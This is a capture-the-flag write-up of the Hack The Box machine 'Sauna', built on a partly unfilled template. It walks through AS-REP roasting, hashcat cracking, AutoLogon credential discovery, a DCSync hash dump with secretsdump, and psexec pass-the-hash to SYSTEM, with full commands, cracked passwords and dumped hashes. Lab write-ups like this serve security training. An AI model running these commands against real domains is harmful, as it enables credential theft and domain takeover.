# HTB - <Machine_Name>

## Overview

![](<machine>.infocard.png)

Short description to include any strange things to be dealt with

## Useful Skills and Tools

zweilos@kalimaa:~/impacket/examples$ sudo python3 psexec.py -hashes :d9485863c1e9e05851aa40cbb4ab9dff Administrator@10.10.10.175
	-Use psexec to pass-the-(NT)hash to get system privileges
	
zweilos@kalimaa:~/impacket/examples$ python3 ./secretsdump.py EGOTISTICALBANK/svc_loanmgr@10.10.10.175
	-Dump hashes from NTDS.DIT from domain server.  Not sure what privs this requires, but need creds first
	-The flag -just-dc-ntlm will make it just dump the LM:NT hashes
	
zweilos@kalimaa:~/impacket/examples$ python3 GetNPUsers.py -outputfile sauna.hash -format hashcat -usersfile /home/zweilos/htb/sauna/users -no-pass -dc-ip 10.10.10.175 EGOTISTICALBANK/fsmith
	-get krb5asrep hash from domain controller; need valid DOMAINNAME/username; output as hashcat format

hashcat -m 18200 -a 0 sauna.hash ~/rockyou.txt --force
	-crack krb5asrep type hashes using a wordlist

in msfconsole: msf5 auxiliary(gather/kerberos_enumusers)
	-enumerates valid users against kerberos from a list; checks for "pre-auth required"

## Enumeration

### Nmap scan

I started my enumeration with an nmap scan of 10.10.10.175. The options I regularly use are: -p-, which is a shortcut which tells nmap to scan all ports, -sC runs a TCP connect scan, -sV does a service scan, and -oN <name> saves the output with a filename of <name>.

```
zweilos@kalimaa:~/htb/sauna$ sudo nmap -p- -sC -sV -oN sauna.nmap 10.10.10.175
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-01 14:07 EDT
Nmap scan report for 10.10.10.175
Host is up (0.14s latency).
Scanned at 2020-06-01 14:07:43 EDT for 553s
Not shown: 65515 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-06-02 01:15:56Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
| ssl-date: 
|_  ERROR: Unable to obtain data from the target
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
| ssl-date: 
|_  ERROR: Unable to obtain data from the target
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
| ssl-date: 
|_  ERROR: Unable to obtain data from the target
3269/tcp  open  tcpwrapped
| ssl-date: 
|_  ERROR: Unable to obtain data from the target
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49686/tcp open  msrpc         Microsoft Windows RPC
61610/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=6/1%Time=5ED544ED%P=x86_64-pc-linux-gnu%r(DNSVe
SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03");

Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h04m02s
| nbstat: 
|_  ERROR: Name query failed: TIMEOUT
| smb-os-discovery: 
|_  ERROR: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
| smb-security-mode: 
|_  ERROR: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-06-02T01:18:23
|_  start_date: N/A
Final times for host: srtt: 137789 rttvar: 1734  to: 144725

Nmap done: 1 IP address (1 host up) scanned in 553.41 seconds
```
Lots of ports
### ldapsearch enumeration
```
zweilos@kalimaa:~/htb/sauna$ ldapsearch -H ldap://10.10.10.175:3268 -x -LLL -s sub -b "DC=EGOTISTICAL-BANK,DC=LOCAL"
dn: DC=EGOTISTICAL-BANK,DC=LOCAL
objectClass: top
objectClass: domain
objectClass: domainDNS
distinguishedName: DC=EGOTISTICAL-BANK,DC=LOCAL
instanceType: 5
whenCreated: 20200123054425.0Z
whenChanged: 20200601223827.0Z
subRefs: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
subRefs: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
subRefs: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
uSNCreated: 4099
uSNChanged: 53269
name: EGOTISTICAL-BANK
objectGUID:: 7AZOUMEioUOTwM9IB/gzYw==
replUpToDateVector:: AgAAAAAAAAACAAAAAAAAAP1ahZJG3l5BqlZuakAj9gwL0AAAAAAAAGIU5
 hQDAAAAQL7gs8Yl7ESyuZ/4XESy7AmwAAAAAAAA1ARSFAMAAAA=
objectSid:: AQQAAAAAAAUVAAAA+o7VsIowlbg+rLZG
wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=EGOT
 ISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Progra
 m Data,DC=EGOTISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=EGO
 TISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrin
 cipals,DC=EGOTISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC=
 EGOTISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=E
 GOTISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=EGO
 TISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=EGOTISTIC
 AL-BANK,DC=LOCAL
wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,
 DC=EGOTISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=EGOTIS
 TICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=EGOTISTICA
 L-BANK,DC=LOCAL
objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,D
 C=LOCAL
gPLink: [LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=Syste
 m,DC=EGOTISTICAL-BANK,DC=LOCAL;0]
dSCorePropagationData: 16010101000000.0Z
masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN
 =Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
msDs-masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Na
 me,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
msDS-IsDomainFor: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-N
 ame,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
dc: EGOTISTICAL-BANK

dn: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL

dn: CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL

dn: CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL

dn: OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL

dn: CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL

dn: CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL

dn: CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL

dn: CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL

dn: CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL

dn: CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL

dn: CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL

dn: CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL

dn: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL

dn: CN=TPM Devices,DC=EGOTISTICAL-BANK,DC=LOCAL

dn: CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL

dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL
```
Hmm... not much to go off, just one potential user named Hugo Smith (though no Windows username to go with it.)


## Road to User
### Finding user creds
Finding user credentials was pretty fast and straightforward for this machine.

in msfconsole: msf5 auxiliary(gather/kerberos_enumusers)
	-enumerates valid users against kerberos from a list; checks for "pre-auth required"
```
msf5 auxiliary(gather/kerberos_enumusers) > run
[*] Running module against 10.10.10.175

[*] Validating options...
[*] Using domain: EGOTISTICALBANK...
[*] 10.10.10.175:88 - Testing User: "hsmith"...
[*] 10.10.10.175:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
[+] 10.10.10.175:88 - User: "hsmith" is present
```
fsmith crashes this scan for some reason...

```
zweilos@kalimaa:~/impacket/examples$ python3 GetNPUsers.py -outputfile sauna.hash -format hashcat -usersfile /home/zweilos/htb/sauna/users -no-pass -dc-ip 10.10.10.175 EGOTISTICALBANK/hsmith

$krb5asrep$23$fsmith@EGOTISTICALBANK:30279f364d10168e316be0713c91cb16$422f07d5f637adc6c396d1999bca49283f7f24c0257ead111b9adf94c623a7247e8e7575905e1ed3978dbce3a7a2b2d293d7339bc80dd2df4154ac019f614809aed59536842505f726e48a0119a18c3bc66d31cfe424269592b558e2ffdd616e36b1f8fccb6e4e16c8a0d9c1b9b668db776d4c46a1fa2d5cd00e2a00c59f218425690286f2bb95b4336ae1edea8def1d3da3ebd1c496da4664c1ce6299b0370dd87219b23243ce47fd1272dd5e1f084305cf1732ce7c5084727a9199935b2bcb3198c17e3d84d339611150501ccf17ae4f16e4784172da981623ac96f14bfbf17cf4afb8df652c089e363f2f07562703db74106bd22179dd37
```
```
zweilos@kalimaa:~/htb/sauna$ hashcat -m 18200 -a 0 sauna.hash ~/rockyou.txt --force

Dictionary cache built:
* Filename..: /home/zweilos/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921506
* Keyspace..: 14344384
* Runtime...: 6 secs

$krb5asrep$23$fsmith@EGOTISTICALBANK:30279f364d10168e316be0713c91cb16$422f07d5f637adc6c396d1999bca49283f7f24c0257ead111b9adf94c623a7247e8e7575905e1ed3978dbce3a7a2b2d293d7339bc80dd2df4154ac019f614809aed59536842505f726e48a0119a18c3bc66d31cfe424269592b558e2ffdd616e36b1f8fccb6e4e16c8a0d9c1b9b668db776d4c46a1fa2d5cd00e2a00c59f218425690286f2bb95b4336ae1edea8def1d3da3ebd1c496da4664c1ce6299b0370dd87219b23243ce47fd1272dd5e1f084305cf1732ce7c5084727a9199935b2bcb3198c17e3d84d339611150501ccf17ae4f16e4784172da981623ac96f14bfbf17cf4afb8df652c089e363f2f07562703db74106bd22179dd37:Thestrokes23
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: Kerberos 5 AS-REP etype 23
Hash.Target......: $krb5asrep$23$fsmith@EGOTISTICALBANK:30279f364d1016...79dd37
Time.Started.....: Tue Jun  2 16:14:24 2020 (52 secs)
Time.Estimated...: Tue Jun  2 16:15:16 2020 (0 secs)
Guess.Base.......: File (/home/zweilos/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   203.5 kH/s (7.13ms) @ Accel:16 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 10539008/14344384 (73.47%)
Rejected.........: 0/10539008 (0.00%)
Restore.Point....: 10534912/14344384 (73.44%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: Tiona172 -> Thelink

Started: Tue Jun  2 16:13:42 2020
Stopped: Tue Jun  2 16:15:18 2020
```

### User.txt

```
zweilos@kalimaa:~/htb/sauna$ evil-winrm -i 10.10.10.175 -u fsmith 
Enter Password: Thestrokes23

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\FSmith\Documents> whoami /all

USER INFORMATION
----------------

User Name              SID
====================== ==============================================
egotisticalbank\fsmith S-1-5-21-2966785786-3096785034-1186376766-1105


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
*Evil-WinRM* PS C:\Users\FSmith\Documents> 
```
Next I collected my hard-earned loot.
```
*Evil-WinRM* PS C:\Users\FSmith\Desktop> cat user.txt
1b5520b98d97cf17f24122a55baf70cf
```

## Path to Power \(Gaining Administrator Access\)

### Enumeration as User `fsmith`

The following output was snipped from the Windows Privilege Escalation Awesome Scripts [Winpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) 
```
--Cut from WinPEAS--
AppCmd.exe was found in C:\Windows\system32\inetsrv\appcmd.exe You should try to search for credentials ?????
Checking for DPAPI Master Keys()
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
    MasterKey: C:\Users\FSmith\AppData\Roaming\Microsoft\Protect\S-1-5-21-2966785786-3096785034-1186376766-1105\ca6bc5b5-57d3-4f19-9f5a-3016d1e57c8f
    Accessed: 1/24/2020 6:30:19 AM
    Modified: 1/24/2020 6:30:19 AM
UDP       10.10.10.175:53                               Listening
    UDP       10.10.10.175:88                               Listening
    UDP       10.10.10.175:137                              Listening
    UDP       10.10.10.175:138                              Listening
    UDP       10.10.10.175:464                              Listening
    UDP       127.0.0.1:53                                  Listening
    UDP       127.0.0.1:52648                               Listening
    UDP       127.0.0.1:53768                               Listening
    UDP       127.0.0.1:53769                               Listening
    UDP       127.0.0.1:57851                               Listening
    UDP       127.0.0.1:59052                               Listening
    UDP       127.0.0.1:62145                               Listening
    UDP       127.0.0.1:62941                               Listening
    UDP       127.0.0.1:62998                               Listening
    UDP       127.0.0.1:63132                               Listening
    UDP       127.0.0.1:65145                               Listening
C:\Windows\System32\OpenSSH\
[+] Looking for AutoLogon credentials(T1012)
    Some AutoLogon credentials were found!!
    DefaultDomainName             :  35mEGOTISTICALBANK
    DefaultUserName               :  35mEGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!

  [+] Home folders found(T1087&T1083&T1033)
    C:\Users\Administrator
    C:\Users\All Users
    C:\Users\Default
    C:\Users\Default User
    C:\Users\FSmith
    C:\Users\Public
    C:\Users\svc_loanmgr
```
Auto-logon is a terrible, terrible service that should never be used, but makes it convenient for users when they are the only ones who use a computer.  As the name implies, Windows will automatically log the user on by cacheing thier credentials when it first loads.  

### Moving laterally to user `svc_loanmanager`

```
zweilos@kalimaa:~/htb/sauna$ evil-winrm -i 10.10.10.175 -u svc_loanmgr
Enter Password: Moneymakestheworldgoround!

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents>whoami /all

USER INFORMATION
----------------

User Name                   SID
=========================== ==============================================
egotisticalbank\svc_loanmgr S-1-5-21-2966785786-3096785034-1186376766-1108


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```
If you have credentials you can try using Impacket's `secretsdump.py` to try to dump password hashes.  These hashes can then be used to either crack and retrieve the passwords or in a pass-the-hash attack.
```
zweilos@kalimaa:~/impacket/examples$ python3 ./secretsdump.py -just-dc-ntlm EGOTISTICALBANK/svc_loanmgr@10.10.10.175
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:21e6b7db7208776337bf12e6c910a32d:::
[*] Cleaning up... 
```
try without -just-dc-ntlm
```
zweilos@kalimaa:~/impacket/examples$ python3 ./secretsdump.py EGOTISTICALBANK/svc_loanmgr@10.10.10.175
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:02bf9a4b95bf3d0e607546f4fd64b9f3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031
Administrator:aes128-cts-hmac-sha1-96:145e4d0e4a6600b7ec0ece74997651d0
Administrator:des-cbc-md5:19d5f15d689b1ce5
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:72c4e8bad48ced051cede83cb4eefb84ae5826980ec3f3c7ba1f9c9ee0db13fc
SAUNA$:aes128-cts-hmac-sha1-96:62f7b14e2f5b7aa57488c26f3dfa54c5
SAUNA$:des-cbc-md5:405b25897f754cc1
[*] Cleaning up... 
```

### Getting a shell
https://en.hackndo.com/pass-the-hash/
```
zweilos@kalimaa:~/impacket/examples$ sudo python3 psexec.py -hashes :d9485863c1e9e05851aa40cbb4ab9dff Administrator@10.10.10.175
Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.10.175.....
[*] Found writable share ADMIN$
[*] Uploading file useqULkm.exe
[*] Opening SVCManager on 10.10.10.175.....
[*] Creating service hsLI on 10.10.10.175.....
[*] Starting service hsLI.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.973]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

### Root.txt

```
C:\Windows\system32>cat C:\users\administrator\desktop\root.txt

f3ee04965c68257382e31502cc5e881f
```
Thanks to [`<box_creator>`](https://www.hackthebox.eu/home/users/profile/<profile_num>) for <something interesting or useful about this machine>.

If you like this content and would like to see more, please consider supporting me through Patreon at [https://www.patreon.com/zweilosec](https://www.patreon.com/zweilosec).
